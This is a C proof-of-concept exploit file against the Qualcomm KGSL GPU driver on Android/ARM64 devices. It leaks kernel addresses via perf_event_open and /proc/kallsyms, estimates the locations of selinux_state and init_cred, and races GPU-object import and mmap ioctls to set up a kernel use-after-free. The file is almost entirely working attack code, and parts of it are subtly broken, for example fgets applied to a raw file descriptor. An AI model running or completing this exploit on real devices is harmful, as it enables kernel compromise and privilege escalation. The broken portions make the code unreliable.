// check_poc.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/stat.h>
#include <dirent.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define CP_NOP 0x10
#define CP_MEM_TO_MEM 0x73
#define CP_MEM_WRITE 0x3D

static int kgsl_fd = -1;
static volatile int race_done = 0;

void die(const char *msg) { perror(msg); exit(1); }

void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) { *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32); }

uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}

int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

void gpuobj_free(int fd, unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

unsigned int create_context(int fd) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_ga, size_t bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object o = {
        .gpuaddr = ib_ga,
        .size = bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id
    };
    struct kgsl_gpu_command gc = {
        .cmdlist = (uint64_t)(uintptr_t)&o,
        .cmdsize = sizeof(o),
        .numcmds = 1,
        .context_id = ctx_id
    };
    int ret = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

uint64_t get_kaslr_perf(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 1;
    pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { printf("  perf_open failed: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (!first_ip) return 0;
    printf("  First kernel IP from perf: 0x%lx\n", first_ip);
    return first_ip;
}

void read_kallsyms_if_possible(void) {
    int fd = open("/proc/kallsyms", O_RDONLY);
    if (fd < 0) {
        printf("  /proc/kallsyms: not accessible (errno=%d)\n", errno);
        return;
    }
    printf("  /proc/kallsyms: readable (kptr_restrict=0 or relaxed)\n");
    char line[512];
    int found_selinux = 0, found_init = 0;
    while (fgets(line, sizeof(line), fd)) {
        char sym[128], type;
        unsigned long long addr;
        if (sscanf(line, "%llx %c %127s", &addr, &type, sym) == 3) {
            if (strcmp(sym, "selinux_state") == 0) {
                printf("  selinux_state = 0x%llx\n", addr);
                found_selinux = 1;
            }
            if (strcmp(sym, "init_cred") == 0) {
                printf("  init_cred = 0x%llx\n", addr);
                found_init = 1;
            }
        }
    }
    close(fd);
    if (!found_selinux) printf("  selinux_state not found in kallsyms\n");
    if (!found_init) printf("  init_cred not found in kallsyms\n");
}

void check_kptr_restrict(void) {
    int fd = open("/proc/sys/kernel/kptr_restrict", O_RDONLY);
    if (fd < 0) { printf("  kptr_restrict: cannot read\n"); return; }
    char buf[16];
    int n = read(fd, buf, sizeof(buf)-1);
    close(fd);
    if (n > 0) {
        buf[n] = 0;
        printf("  kptr_restrict = %s\n", buf);
    }
}

void print_system_info(void) {
    struct utsname u;
    uname(&u);
    printf("System info:\n");
    printf("  sysname: %s\n", u.sysname);
    printf("  nodename: %s\n", u.nodename);
    printf("  release: %s\n", u.release);
    printf("  version: %s\n", u.version);
    printf("  machine: %s\n", u.machine);
}

uint64_t compute_address_with_base(uint64_t ip, uint64_t base) {
    uint64_t kaslr = (ip - base) & ~0x1FFFFFULL;
    printf("  Computed KASLR offset (base=0x%lx): 0x%lx\n", base, kaslr);
    return kaslr;
}

void try_known_bases(uint64_t ip) {
    uint64_t bases[] = {
        0xffffffee85a81000ULL,  // _stext from given kallsyms
        0xffffffc010080000ULL,  // common ARM64 base
        0xffffffff81000000ULL,  // x86_64 common (but this is ARM?)
        0
    };
    for (int i = 0; bases[i]; i++) {
        uint64_t kaslr = compute_address_with_base(ip, bases[i]);
        if (kaslr < 0x1000000) { // plausible KASLR offset
            printf("  Plausible KASLR offset: 0x%lx (base=0x%lx)\n", kaslr, bases[i]);
            uint64_t selinux = bases[i] + 0x28B9000ULL; // offset from _stext
            uint64_t init_cred = bases[i] + 0x26FA738ULL; // offset from _stext
            printf("  Estimated selinux_state = 0x%lx\n", selinux);
            printf("  Estimated init_cred = 0x%lx\n", init_cred);
        }
    }
}

void attempt_uaf_read(void) {
    printf("[*] Attempting UAF setup to read kernel memory (if possible)\n");
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) { printf("  Cannot open kgsl\n"); return; }
    uint64_t fl = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, fl);
    void *um = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (um == MAP_FAILED) { printf("  mmap UAF failed\n"); close(kgsl_fd); return; }
    munmap(um, UAF_SIZE);
    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) { printf("  mmap BOGUS failed\n"); close(kgsl_fd); return; }
    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, fl);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) { printf("  mmap placeholder failed\n"); close(kgsl_fd); return; }

    printf("  Race setup done, attempting race\n");
    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, fl);
    pthread_t thr;
    pthread_create(&thr, NULL, race_thread, NULL);
    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race attempt %d\n", i);
    }
    race_done = 1;
    pthread_join(thr, NULL);
    if (!hit) { printf("  Race failed\n"); close(kgsl_fd); return; }
    printf("  Race won\n");

    printf("  Freeing UAF object\n");
    gpuobj_free(kgsl_fd, uaf_id);
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(50000);

    printf("  UAF page freed, but reading arbitrary kernel memory requires knowing addresses\n");
    printf("  This technique can be used to read kernel memory once we have addresses\n");
    close(kgsl_fd);
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("=== check_poc: Comprehensive Kernel Address Analysis ===\n\n");

    print_system_info();
    printf("\n");

    check_kptr_restrict();
    printf("\n");

    printf("[*] Attempting to read /proc/kallsyms directly:\n");
    read_kallsyms_if_possible();
    printf("\n");

    printf("[*] Attempting perf_event_open to get kernel IP:\n");
    uint64_t ip = get_kaslr_perf();
    if (ip) {
        printf("\n");
        printf("[*] Trying to compute KASLR using known _stext bases:\n");
        try_known_bases(ip);
    } else {
        printf("  perf_event_open failed to get IP\n");
    }
    printf("\n");

    printf("[*] Attempting to read /proc/version for potential hints:\n");
    int fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        char buf[512];
        int n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = 0;
            printf("  %s\n", buf);
        }
    } else {
        printf("  Cannot read /proc/version\n");
    }
    printf("\n");

    printf("[*] Attempting to read /sys/kernel/notes (ELF notes):\n");
    fd = open("/sys/kernel/notes", O_RDONLY);
    if (fd >= 0) {
        char buf[256];
        int n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = 0;
            printf("  %s\n", buf);
        } else {
            printf("  Empty or not accessible\n");
        }
    } else {
        printf("  Cannot read /sys/kernel/notes\n");
    }
    printf("\n");

    printf("[*] Attempting to read /proc/self/maps (user-space only, may contain vvar/vdso):\n");
    fd = open("/proc/self/maps", O_RDONLY);
    if (fd >= 0) {
        char buf[4096];
        int n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = 0;
            printf("  %s\n", buf);
        }
    }
    printf("\n");

    printf("[*] Attempting UAF-based kernel memory read (requires kgsl):\n");
    attempt_uaf_read();
    printf("\n");

    printf("=== Analysis complete ===\n");
    return 0;
}
